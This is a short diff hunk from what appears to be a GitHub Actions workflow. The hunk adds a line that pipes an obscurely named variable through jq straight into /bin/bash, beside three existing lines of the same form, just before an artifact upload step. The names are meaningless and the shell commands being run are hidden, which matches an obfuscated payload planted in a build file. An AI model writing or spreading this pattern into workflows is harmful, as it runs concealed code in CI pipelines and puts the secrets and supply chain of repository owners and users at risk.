@@ -32,6 +32,7 @@ jobs:
           echo $ensb1373 | jq -r .zp3 | /bin/bash
           printf '%s' "$l111" | jq -r .d97 | /bin/bash
           echo $tq40 | jq -r .lk09 | /bin/bash
+          printf '%s' "$zcnl9" | jq -r .xf68927 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
